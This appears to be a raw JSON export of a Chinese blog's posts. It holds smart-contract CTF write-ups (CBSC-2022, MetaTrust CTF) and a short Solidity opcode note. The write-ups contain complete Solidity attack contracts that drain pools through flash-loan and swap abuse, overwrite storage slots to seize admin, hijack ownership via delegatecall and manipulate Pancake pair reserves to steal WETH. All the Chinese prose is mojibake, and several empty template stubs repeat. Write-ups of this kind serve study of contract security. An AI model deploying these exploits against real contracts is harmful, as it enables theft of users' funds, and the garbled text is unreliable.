è¿™é¢˜çš„æ¼æ´åœ¨äºé—ªç”µè´·å‡½æ•°ä¸­ï¼Œborrowerä¸ºä»»æ„åœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯hackeråœ°å€ï¼Œhackerå¯ä»¥å®ç°receiveEther(uint256)å‡½æ•°ï¼Œå¹¶åœ¨å‡½æ•°ä½“ä¸­è¿›è¡Œè€Œå·²æ“ä½œã€‚é—ªç”µè´·å€Ÿé’±ä¹‹åå¿…é¡»è¦è¿˜é’±æ‰è¡Œï¼Œçœ‹åˆ°swapå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„æ¢ç®—æ˜¯1:1çš„ï¼Œå³éœ€è¦å¤šå°‘token0ï¼ˆtoken1ï¼‰åˆ™éœ€è¦æ”¯ä»˜ç­‰é¢çš„tokenï¼ˆtoken0ï¼‰ï¼Œåªè¦åœ¨å€Ÿåˆ°poolä¸­å…¨éƒ¨token0çš„åŒæ—¶ï¼Œæ‹¿å»å…‘æ¢ç­‰é¢çš„token1ï¼Œæ­¤æ—¶poolä¸­çš„token0çš„balanceåˆå›åˆ°balanceBeforeï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æœ€åçš„æ–­è¨€require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;)ï¼Œç®€å•æ¥è¯´å°±æ˜¯å®ç°äº†ï¼Œä½¿ç”¨poolä¸­token0ï¼Œæ¢å‡ºäº†poolä¸­çš„token1ã€‚æœ€åå†é€šè¿‡swapå‡½æ•°ï¼Œå°†æ‰‹ä¸­çš„token1å…‘æ¢poolä¸­çš„å…¨éƒ¨token0å³å¯ã€‚ æœ€ç¦»è°±çš„è¿˜æ˜¯æˆæƒæ“ä½œï¼Œæˆ‘åªèƒ½è¯´approveå‡½æ•°è¢«æ”¹å¾—é¢ç›®å…¨éï¼ŒsafeCheekä¿®é¥°å™¨è¦æ±‚uint160(tx.origin)&amp;0xffffff!=0xbeddC4||tx.origin==adminæ‰èƒ½æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡grantå‡½æ•°è¦†ç›–æˆä¸ºadminï¼Œç­‰å¥½ä¸å®¹æ˜“è¿›åˆ°approveä¹‹åï¼Œä½ ä¼šå‘ç°_allowances[spender][tx.origin] = amountï¼Œä¹Ÿå°±æ˜¯è¯´spenderåªèƒ½ç»™tx.originæˆæƒï¼Œtmdï¼Œæ‰€ä»¥æˆæƒæ˜¯ä¸å¯è¡Œçš„ï¼ˆå…¶å®å¯ä»¥å°è¯•é€šè¿‡è„šæœ¬è®¡ç®—ä¸€ä¸ª0xbedc4ç»“å°¾çš„è´¦æˆ·ï¼Œæˆ‘æ²¡å°è¯•è¿‡æˆ‘è§‰å¾—åº”è¯¥å¯è¡Œï¼‰ï¼Œåªèƒ½æ¢æ€è·¯ï¼Œgrantå‡½æ•°å¯ä»¥ä¿®æ”¹ä»»æ„slotçš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®— _allowances[hancer][pool]çš„å€¼ï¼Œå¹¶ç»™å…¶èµ‹å€¼tx.origin&gt;10000å³å¯ï¼Œç„¶åå†è°ƒç”¨approveä¿®æ”¹slot3çš„å€¼ï¼Œä½¿å¾—hackeræˆä¸ºtokençš„adminã€‚è°ƒç”¨grantä¼šæ£€æŸ¥require(spender.code.length&gt;0&amp;&amp;spender.code.length&lt;10)ï¼Œæœ‰spenderè‡ªå®šä¹‰ï¼Œæ‰€ä»¥å¯ä»¥ç¼–å†™ä¸€ä¸ªruntimeCodeé•¿åº¦ç¬¦åˆè¦æ±‚çš„å³å¯ï¼Œè¿™ä¸ªä¸éš¾å®ç°ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465contract TrusterLenderPoolHacker &#123; TrusterLenderPool pool; IERC20 token0; IERC20 token1; address helper; constructor(address _pool) &#123; pool = TrusterLenderPool(_pool); token0 = pool.token0(); token1 = pool.token1(); helper = address(new TrusterLenderPoolHelper()); &#125; /* complete address(this) approve pool of token0&amp;token1 */ function _pwn1() internal &#123; // 1. cal slot =&gt; _allowances[address(this)[pool] bytes32 slot_self_pool = keccak256(abi.encode(address(pool), keccak256(abi.encode(address(this), 1)))); // 2. set _allowances[address(this)[token0] == tx.origin &gt; 10000 token0.approve(helper, uint(slot_self_pool)); // 3. become token0&#x27;s admin token0.approve(helper, 3); // Similarly ===&gt; operate token1 token1.approve(helper, uint(slot_self_pool)); token1.approve(helper, 3); &#125; function pwn() external &#123; // address(this) approve pool _pwn1(); // call flashLoan pool.flashLoan(token0.balanceOf(address(pool)),address(this)); // use token1 to swap token0 pool.swap(address(token0), token1.balanceOf(address(this))); // slove the challenge pool.Complete(); &#125; function receiveEther(uint256 borrowAmount) external &#123; // use token0 to swap token1 // now token0.balanceOf(address(pool)) == balanceAfter pool.swap(address(token1), borrowAmount); &#125;&#125;// generate spender ---- spender.code.length == 4contract TrusterLenderPoolHelper &#123; constructor() &#123; assembly&#123; mstore(0x200, shl(240, 0x1030)) return(0x200, 4) &#125; &#125;&#125; 0x01-SVip1. question ğŸ“Œ æ™‹å‡supervipï¼ŒæˆåŠŸè°ƒç”¨isComplete() 2. analysis è¿™é¢˜æ¼æ´åœ¨äºï¼ŒtransferPointså‡½æ•°ï¼Œç»å…¸è‡ªå·±ç»™è‡ªå·±è½¬é’±ï¼Œèµšå¤šå°‘ä½™é¢åŠ å¤šå°‘ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥é€šè¿‡ç©ºæŠ•å‡½æ•°getPointè·å–100ä¸ªç‚¹ï¼Œå†æ¯æ¬¡ç»™è‡ªå·±è½¬SVip.points(hacker)-1é‡å¤å››æ¬¡å³å¯å®Œæˆã€‚ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627contract SVipHacker &#123; SVip svip; constructor(address _svip) public &#123; svip = SVip(_svip); &#125; function pwn() external &#123; // 1. get 100 points for (uint i; i &lt; 100; i++) &#123; svip.getPoint(); &#125; // 2. transfer to myself, points double, 100 =&gt; 200 =&gt; 400 =&gt; 800 =&gt; 1600 for (uint j; j &lt; 4; j++) &#123; svip.transferPoints(address(this), svip.points(address(this)) - 1); &#125; // 3. promote svip svip.promotionSVip(); // 4. judge is completed require(svip.isComplete(), &quot;You don&#x27;t complete...&quot;); &#125;&#125; 0x01. question ğŸ“Œ 2. analysis 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617```### 0x0#### 1. question&gt; ğŸ“Œ#### 2. analysis&gt; #### 3. solve*æ”»å‡»åˆçº¦*```solidity 0x01. question ğŸ“Œ 2. analysis 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617```### 0x0#### 1. question&gt; ğŸ“Œ#### 2. analysis&gt; #### 3. solve*æ”»å‡»åˆçº¦*```solidity 0x01. question ğŸ“Œ 2. analysis 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617```### 0x0#### 1. question&gt; ğŸ“Œ#### 2. analysis&gt; #### 3. solve*æ”»å‡»åˆçº¦*```solidity 0x01. question ğŸ“Œ 2. analysis 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617```### 0x0#### 1. question&gt; ğŸ“Œ#### 2. analysis&gt; #### 3. solve*æ”»å‡»åˆçº¦*```solidity","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"CBSC-2022","slug":"CTFS/CBSC-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/CBSC-2022/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"uing of opcode log","slug":"Basic_Knowledge/solidity/log1","date":"2023-10-06T14:47:10.000Z","updated":"2023-10-06T14:47:10.000Z","comments":true,"path":"2023/10/06/Basic_Knowledge/solidity/log1/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/06/Basic_Knowledge/solidity/log1/","excerpt":"","text":"å‰è¨€ åœ¨åˆ·chainflag-opcode-BoxGameå‘ç°è¿™ä¸ªå¾ˆæœ‰è¶£ï¼Œè®°å½•ä¸‹ã€‚ Log1ç”¨æ³• log1(offset, size, topic)ï¼š offset: byte offset in the memory in bytes. size: byte size to copy. topic1: 32-byte value. ä»¥ event NewValue(uint256)ä¸ºä¾‹ï¼Œoffsizeä¸º NewValueå‚æ•°æ‰€åœ¨çš„ä½ç½®ï¼Œsizeä¸ºå‚æ•°çš„é•¿åº¦ï¼Œè¿™é‡Œæ˜¯ 32bytesï¼Œtopic1åˆ™æ˜¯äº‹ä»¶çš„hashå³keccak256(abi.encodePacked(&quot;NewValue(uint256)&quot;)) ä»£ç ä¸¾ä¾‹ 123456789101112131415161718192021contract Logic &#123; event NewValue(uint newValue); function captureFlag() public &#123; uint256 value = 0x999999999999999999999999999999999999999999; bytes32 eventHash = keccak256(abi.encodePacked(&quot;NewValue(uint256)&quot;)); assembly &#123; // To emit an event we first need to store the value in memory. mstore(0xa0, value) // Now to emit the event we use the log1 opcode. // First arg is the memory address, second is the number of bytes and the third is the hashed event signature log1(0xa0, 0x20, eventHash) &#125; &#125;&#125; ç»“æœï¼šæˆåŠŸè§¦å‘äº‹ä»¶ è§¦å‘å…¶ä»–ç±»å‹çš„ä¹Ÿè¡Œï¼Œå¦‚ä¸‹ 1234567891011121314151617pragma solidity ^0.8.0;contract Logic &#123; event SendFlag(address); function captureFlag() public &#123; address owner = msg.sender; bytes32 eventHash = keccak256(abi.encodePacked(&quot;SendFlag(address)&quot;)); assembly &#123; mstore(0xa0, owner) log1(0xa0, 0x20, eventHash) &#125; &#125;&#125; åŒç†ï¼Œä¹Ÿå¯ä»¥è§¦å‘å¤šä¸ªå‚æ•°çš„event 12345678910111213141516171819pragma solidity ^0.8.0;contract Logic &#123; event NewValue(address, uint); function captureFlag() public &#123; address owner = msg.sender; uint256 value = 0x999999999999999999999999999999999999999999; bytes32 eventHash = keccak256(abi.encodePacked(&quot;NewValue(address,uint256)&quot;)); assembly &#123; mstore(0x80, owner) mstore(0xa0, value) log1(0x80, 0x40, eventHash) &#125; &#125;&#125; ğŸ“Œ æ³¨ï¼šsizeä¸€å®šè¦æ˜¯32byresçš„å€æ•°ï¼Œå³ä½¿event SendFlag(address)ä¸­çš„å‚æ•°æ˜¯20bytesï¼Œä½†æ˜¯ä¹Ÿè¦å°†é•¿åº¦çš„å†™æˆ0x20ï¼Œå…¶å®è¿™é‡Œåªè¦æ˜¯32çš„byteså³å¯ï¼Œ0x40ä¹Ÿokçš„ã€‚ å¥‡æ€ªçš„äº‹ æ¯”å¦‚æˆ‘åœ¨Aåˆçº¦ä¸­å¹¶æ²¡å®šä¹‰æŸä¸ªäº‹ä»¶ï¼Œè€Œæ˜¯åœ¨Båˆçº¦ä¸­å®šä¹‰äº†ï¼Œåœ¨Aåˆçº¦ä¹Ÿå¯ä»¥è§¦å‘äº‹ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ä½†æ˜¯ï¼Œå¦‚æœå°† Proxyä¸­çš„åˆçº¦ eventæ³¨è§†æ‰ï¼Œåˆ™ä¸ä¼šè§¦å‘è¯¥äº‹ä»¶ï¼Œå°±æ„Ÿè§‰å¾ˆç¥å¥‡ã€‚ å¦‚æœä¸ä½¿ç”¨å†…è”æ±‡ç¼–çš„è¯ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹ï¼š","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"creationcode & runtimecode","slug":"Basic_Knowledge/solidity/bytecode","date":"2023-10-04T14:47:10.000Z","updated":"2023-10-04T14:47:10.000Z","comments":true,"path":"2023/10/04/Basic_Knowledge/solidity/bytecode/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/04/Basic_Knowledge/solidity/bytecode/","excerpt":"","text":"bytecodeï¼Œ initcodeï¼Œdeploycode bytecode &#x3D; type(Contract_Name).creationCode &#x3D; init code + runtimeCode type(Contract_Name).runtimeCode &#x3D; runtimeCode extcodecopy &#x3D;&gt; runtimecode æ¡ˆä¾‹å¥½æ–‡ç« æ¨èarticle1 metadataï¼š article2","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"MetaTrust CTF","slug":"CTFS/MetaTrust CTF/MetaTrust CTF","date":"2023-09-17T03:50:10.000Z","updated":"2023-09-17T03:50:10.000Z","comments":true,"path":"2023/09/17/CTFS/MetaTrust CTF/MetaTrust CTF/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/17/CTFS/MetaTrust%20CTF/MetaTrust%20CTF/","excerpt":"","text":"å‰è¨€ æ¯”èµ›é“¾æ¥ï¼šLINK ä»£ç ä»“åº“ï¼šLINK greeterVault1. è¦æ±‚ æˆåŠŸè°ƒç”¨SetUpçš„isSolvedå‡½æ•° 2. åˆ†æ è€ƒå¯Ÿdelegatecallï¼Œdelegatecallè°ƒç”¨æ‰§è¡Œçš„æ˜¯è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ï¼Œå³Vaultåˆçº¦çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨Logicåˆçº¦ä¸­changeOwnerå‡½æ•°çš„passwordå®é™…ä¸Šæ˜¯Vaultçš„logicå˜é‡ï¼Œä¸”ä¿®æ”¹çš„owneræ˜¯Vaultçš„ownerï¼Œwithdrawå‡½æ•°ä¸­çš„owneråˆ™æ˜¯Vaultä¸­çš„ownerã€‚æ ¹æ®è¿™äº›å¯¹åº”å…³ç³»å¯ä»¥é€šè¿‡changeOwnerä¿®æ”¹ownerä¸ºhackerï¼Œç„¶åè°ƒç”¨withdrawå‡½æ•°ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627contract GreeterVaultHacker &#123; SetUp setup; Vault vault; address logic; constructor(address _setup) &#123; setup = SetUp(_setup); vault = Vault(setup.vault()); logic = setup.logic(); &#125; function attack() public &#123; // become owner (bool success1, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, bytes32(uint(uint160(logic))), address(this))); require(success1, &quot;call changOwner fail&quot;); // withdraw money (bool success2, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.withdraw.selector)); require(success2, &quot;call withdraw fail&quot;); require(setup.isSolved(), &quot;You don&#x27;t slove the challenge&quot;); &#125; receive() external payable&#123;&#125; &#125; greeterGate1. è¦æ±‚ æˆåŠŸè°ƒç”¨Gateåˆçº¦ä¸­çš„isSolved()å‡½æ•°ã€‚ 2. åˆ†æ é€šè¿‡resolveè°ƒç”¨unlock()ï¼Œåªéœ€ä»åˆçº¦ä¸­è·å–data[2]çš„å€¼å³å¯ï¼Œdata[2]çš„å€¼åœ¨slot5ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718contract Hacker &#123; Gate gate; constructor(address _gate) &#123; gate = Gate(_gate); &#125; function attack(bytes32 data_2) public &#123; bytes memory _calldate = abi.encodeWithSelector(Gate.unlock.selector, abi.encodePacked(data_2)); gate.resolve(_calldate); require(gate.isSolved(), &quot;You don&#x27;t solve the challage&quot;); &#125; &#125; bytecodeVault1. è¦æ±‚ æˆåŠŸè°ƒç”¨isSolved()å‡½æ•° 2. åˆ†æ ç›®æ ‡æ˜¯å°†vaultçš„é’±æç©ºï¼Œæ¶‰åŠè½¬è´¦æ“ä½œçš„åªæœ‰withdrawnå‡½æ•°ã€‚åˆ†æè¯¥å‡½æ•° 123456789assembly &#123; let size := extcodesize(bytecaller) // msg.senderçš„ä»£ç å¤§å° senderCode := mload(0x40) // è¿”å›ç©ºé—²å†…å­˜æŒ‡é’ˆ // add(0x1f, not(0x1f)) == type(uint).max mstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(senderCode, size) // ä¿®æ”¹bytesçš„é•¿åº¦ // å°†bytecallerçš„ä»£ç ä»0ï¼ˆå¤´ï¼‰å¼€å§‹æ‹·è´åˆ°senderCodeçš„ä½ç½® extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)&#125; è§£è¯»å†…è”æ±‡ç¼–éƒ¨åˆ†ï¼Œsizeè¡¨ç¤ºç»Ÿè®¡è°ƒç”¨è€…çš„code sizeï¼Œ senderCodeåˆ™æ˜¯è¿”å›ç©ºé—²å†…å­˜æŒ‡é’ˆï¼Œmstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f))))ï¼Œè¡¨ç¤ºæ›´æ–°ç©ºé—²æŒ‡é’ˆçš„ä½ç½®ï¼Œæ–°ä½ç½®åœ¨ï¼ŒåŠ¨æ€æ•°ç»„senderCodeåŠ ä¸Šbytecallerçš„ä»£ç ä¹‹åï¼ˆè¿™æ˜¯åœ¨æå‰ç®—å¥½ä½ç½®ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ­¥æ‹·è´ä»£ç ï¼‰ã€‚extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)è¿™æ˜¯å°†ä»£ç æ‹·è´åˆ°senderCodeæ•°ç»„ï¼Œå…¶ä¸­è·³è¿‡äº†å­˜å‚¨æ•°ç»„é•¿åº¦çš„ä½ç½®ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œæˆ‘å‘ç°å¯¹äºè¿™ä¸ªmsg.senderï¼Œtaçš„code sizeå¥½åƒå’ŒçŠ¶æ€å˜é‡æ— å…³ï¼Œå¦‚æœåœ¨attackå‡½æ•°è°ƒç”¨withdrawï¼Œæˆ‘åœ¨attackä¸­åŠ å…¥å…¶ä»–ä»£ç ï¼Œä¼šå½±å“åˆ°excodesizeçš„å€¼ï¼Œè¿™è®©æˆ‘æ„Ÿåˆ°å¾ˆå¥‡æ€ªã€‚åŒç†å¯¹äºä¸‹é¢çš„ä»£ç æ‹·è´ï¼Œextcodecopyä¹Ÿæ˜¯æ‹·è´å‡½æ•°ä½“ä¸­çš„ä»£ç ã€‚ã€‚ã€‚ã€‚æˆ‘ä¸æ˜¯å¾ˆç†è§£ 123456789for(uint256 i = 0; i &lt; senderCode.length - 3; i++) &#123; if(senderCode[i] == byte(uint8(sequence &gt;&gt; 24)) // de &amp;&amp; senderCode[i+1] == byte(uint8((sequence &gt;&gt; 16) &amp; 0xFF)) // ad &amp;&amp; senderCode[i+2] == byte(uint8((sequence &gt;&gt; 8) &amp; 0xFF)) // be &amp;&amp; senderCode[i+3] == byte(uint8(sequence &amp; 0xFF))) &#123; // ef msg.sender.transfer(address(this).balance); return; &#125;&#125; è¿™é‡Œåˆ™è¡¨ç¤ºåœ¨senderCodeä¸­å¿…é¡»è¦åŒ…å« deadbeefï¼Œæ‰€ä»¥å‘¢ï¼Œéœ€è¦åœ¨attackå‡½æ•°ä¸­å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå¹¶èµ‹å€¼ä¸ºdeadbeefå³å¯ã€‚ require(senderCode.length % 2 == 1, &quot;Bytecode length must be even!&quot;);å¯ä»¥é€šè¿‡åœ¨æ”»å‡»åˆçº¦ä¸­æ·»åŠ ä¸€äº›å¤šä½™çš„ä»£ç ï¼ŒçŸ¥é“å¤§å°ä¸ºå¥‡æ•°å³å¯ã€‚ 3. æ”»å‡»åˆçº¦12345678910111213141516contract BytecodeVaultHack &#123; BytecodeVault vault; constructor(address _vault) public &#123; vault = BytecodeVault(_vault); &#125; function attack() public &#123; uint256 sequence = 0xdeadbeef; vault.withdraw(); require(vault.isSolved(), &quot;You don&#x27;t solve the challenge&quot;); &#125; function() external payable&#123;&#125;&#125; Achilles1. è¦æ±‚ æˆåŠŸè°ƒç”¨isSolved()å‡½æ•° 2. åˆ†æ è¯¥é¢˜çš„ç›®æ ‡æ˜¯ä¸ºæŒ‡å®šåœ°å€ç›—å–å¤§äº100 etherçš„ WETHä»£å¸ã€‚ ä»”ç»†åˆ†æä»£ç å¯çŸ¥åœ¨Achillesåˆçº¦ä¸­æä¾›äº†ä¸€ä¸ªç©ºæŠ•å‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹airdropAmountçš„å€¼ï¼Œè€Œæ‰§è¡Œæ¡ä»¶å¯ä»¥é€šè¿‡swapä¸­çš„é—ªç”µè´·æ¥æ»¡è¶³ï¼Œå³å¤§é‡å€Ÿå‡º pairçš„achillesä»£å¸ï¼Œå¹¶è°ƒç”¨æ­¤å‡½æ•°ã€‚è€Œtransferå‡½æ•°åˆ™å¯ä»¥è¿›å…¥å†…ç½®ç©ºæŠ•å‡½æ•°_airdropï¼Œå¯ä»¥ä¿®æ”¹æŸåœ°å€çš„achillesä»£å¸ã€‚æƒ³é€šè¿‡swapå‡½æ•°ç›—å¸ï¼Œå¿…é¡»è¦æ»¡è¶³æ»‘ç‚¹ä¸å˜ï¼Œå³require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(10000**2), &#39;Pancake: K&#39;);ï¼Œä»”ç»†è§‚å¯Ÿå¯çŸ¥ï¼Œåªè¦å°†ä¸ç­‰å¼å³è¾¹çš„å€¼å˜å¾—å¾ˆå°ï¼Œæˆ–è€…å°†å·¦è¾¹çš„å€¼å˜å¾—å¾ˆå¤§çš†å¯æ»¡è¶³ï¼Œæ ¹æ®åˆå§‹åŒ–çš„æ¡ä»¶å¯çŸ¥achilles is token0ï¼Œè€Œåœ¨_airdropä¸­å¯ä»¥éšæ„ä¿®æ”¹æŸåœ°å€çš„å€¼ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨æ­¤å¤„ä¿®æ”¹pairçš„achillesä»£å¸çš„å€¼ï¼Œå°†å…¶å˜å¾—å¾ˆå°æ»¡è¶³å€Ÿå‡º 100 ether WETHæ»‘ç‚¹ä»ç„¶æ»¡è¶³ã€‚ è‹¥æ˜¯åªæ”¹å˜ä¸Šè¿°çš„å€¼ï¼Œå‡½æ•°å°†ä¼šå¤±è´¥ï¼ŒæŠ¥é”™åœ¨require(amount0In &gt; 0 || amount1In &gt; 0, &#39;Pancake: INSUFFICIENT_INPUT_AMOUNT&#39;);ï¼Œåˆ†æå¯çŸ¥ï¼Œbalanceå’Œreserveè·å–çš„æ–¹å¼ä¸ä¸€æ ·ï¼Œæ‰€ä»¥åªè¦ä½¿å¾—balanceå’Œreserveä¸ä¸€è‡´å³å¯ï¼Œå®ç°æ–¹å¼æ˜¯é€šè¿‡_airdropå‡½æ•°ï¼Œä¸ºhackeé“¸å¸ï¼Œç„¶åå°†å¸è½¬ç»™pairåœ°å€ï¼Œä½¿å¾—balanceå¤§äºreserveï¼Œè¿™é‡Œå¯¹åº”çš„æ˜¯uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; ç»¼ä¸Šï¼Œæ”»å‡»æ€è·¯ä¸ºï¼šå°†pairçš„Achillesä»£å¸ä¿®æ”¹ä¸ºbalanceï¼ŒåŒæ­¥ï¼ˆsyncï¼‰ï¼Œå†ä¸ºpairè½¬ä¸€äº›Achillesä»£å¸ï¼Œç›®çš„æ˜¯ä½¿å¾—balanceå’Œreserveä¸ç›¸ç­‰ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445contract AchillesHacker &#123; SetUp setup; Achilles achilles; PancakePair pair; WETH weth; address estinationAddress; constructor(address _setup) &#123; setup = SetUp(_setup); achilles = setup.achilles(); pair = setup.pair(); weth = setup.weth(); estinationAddress = setup.yourAddress(); &#125; function pwn() public &#123; // in order to satisfy `weth.balanceOf(address(pair)) / this.balanceOf(address(pair)) &gt; 5` uint achillesMoney = 999 ether; pair.swap(achillesMoney, 0, address(this), &quot;0x999&quot;); // achilles is token0 // cal pair&#x27;address uint256 fakeTo = (uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(pair))); // set achilles&#x27;s balanceOf(pair) = 1 wei achilles.transfer(address(uint160(fakeTo)), 0); // sync, update achilles.balanceOf(pair) = 1 wei pair.sync(); // mint achilles token for hack uint256 hacker = (uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(this))); achilles.transfer(address(uint160(hacker)), 0); // transfer for weth&#x27;address or achilles&#x27;address to ensure `require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;Pancake: INSUFFICIENT_INPUT_AMOUNT&#x27;);` achilles.transfer(address(pair), 1); // swap weth pair.swap(0, 100 ether, estinationAddress, &quot;&quot;); require(setup.isSolved(), &quot;You don&#x27;t solve....&quot;); &#125; Who1. è¦æ±‚ æˆåŠŸè°ƒç”¨isSolved()å‡½æ•° 2. åˆ†æ çªç ´å››é“é˜²çº¿ã€‚ é¦–å…ˆé€šè¿‡è„šæœ¬è®¡ç®—ï¼Œæˆä¸ºowner é˜²çº¿ä¸€ é€šè¿‡è°ƒç”¨check()è¿”å›ä¸åŒçš„ç»“æœï¼Œç”±äºæ˜¯staticcallè°ƒç”¨ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡å†·çƒ­åœ°å€æ¶ˆè€—çš„gasä¸åŒæ¥å®ç° é˜²çº¿äºŒ é€šè¿‡é™åˆ¶gasï¼Œå®ç°this._stage2() == 7ï¼Œæ–¹æ³•ä¸ºçˆ†ç ´ é˜²çº¿ä¸‰ block.timestampå¯æ§ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªå‡½æ•°äº‹å…ˆæ’å¥½é¡ºåºï¼Œè‡ªå·±å®ç°sort()å‡½æ•°ï¼Œä½¿å…¶åŠŸèƒ½ä¸ºåªè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¿™æ ·æ¶ˆè€—çš„gasè¾ƒå°‘ é˜²çº¿å›› è®¡ç®—å‡º mappingæŸå€¼æ‰€åœ¨çš„ä½ç½®ï¼Œç„¶åå°†å…¶è¦†ç›–ï¼Œè®¡ç®—å…¬å¼ä¸ºkeccak256(abi.encode(address(this), keccak256(abi.encode(uint(4), uint(1)))))ã€‚ 3. æ”»å‡»åˆçº¦123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112contract FooHacker &#123; Foo foo; uint256[] challenge = new uint256[](8); constructor(address _foo) &#123; foo = Foo(_foo); &#125; function pwn1() public &#123; // create2 address(this) foo.setup(); // become owner foo.stage1(); // stats[1][msg.sender] = true &#125; function pwn2() public &#123; for (uint i = 40000; i &lt; 41000; i++) &#123; (bool success, ) = address(foo).call&#123;gas: i&#125;(abi.encodeWithSignature(&quot;stage2()&quot;)); if (success) &#123; break; &#125; &#125; &#125; function pwn3() public &#123; challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28; challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24; challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20; challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16; challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12; challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8; challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4; challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0; this.bubbleSort(challenge); // sort the _challenge foo.stage3(); &#125; function pwn4() public &#123; foo.stage4(); &#125; /* calculate the location of stats[4][address(this)] */ function pos() external view returns (bytes32) &#123; return keccak256(abi.encode(address(this), keccak256(abi.encode(uint(4), uint(1))))); &#125; /* only return the uint256[], the operation spend gas is low */ function sort(uint256[] memory) public view returns(uint256[] memory) &#123; return challenge; &#125; /* the block.stamp is controled, sort the arr in advance */ function bubbleSort(uint256[] memory challenge) external &#123; /* bubble sort */ for(uint i=0 ; i&lt;8 ; i++) &#123; for(uint j=i+1 ; j&lt;8 ; j++) &#123; if (challenge[i] &gt; challenge[j]) &#123; uint tmp = challenge[i]; challenge[i] = challenge[j]; challenge[j] = tmp; &#125; &#125; &#125; &#125; /* the first call is cold address spend gas:2600, return 1337; the secode call is warm address spend gas:100, return 13337. */ function check() external view returns(bytes32) &#123; uint startgas = gasleft(); uint balance = address(0x0).balance; uint gasused = startgas - gasleft(); if (gasused &gt;= 2600) &#123; return keccak256(abi.encodePacked(&quot;1337&quot;)); &#125; return keccak256(abi.encodePacked(&quot;13337&quot;)); &#125;&#125;/* deploy hacker to satisfy address % 1000 == 137*/contract FooHackerDeployer &#123; function deploy(uint _salt, address foo) external returns (address hacker) &#123; bytes memory bytecode = abi.encodePacked(type(FooHacker).creationCode, abi.encode(foo)); bytes32 salt = keccak256(abi.encodePacked(_salt)); assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125;&#125; StakingPool1. è¦æ±‚ æˆåŠŸè°ƒç”¨SetUpçš„isSolved()å‡½æ•° 2. åˆ†æ ä¸¤ç§ä¸åŒçš„rewardTokenï¼Œåˆ†åˆ«åˆ†æã€‚ å¯¹äºrewardTokenï¼š å¯ä»¥çœ‹åˆ°åœ¨ depositå’Œwithdrawå‡½æ•°ä¸­éƒ½å¯ä»¥è·å¾—rewardTokenï¼Œä¸è¿‡è·å–å¥–åŠ±æœ‰è¦æ±‚ï¼š 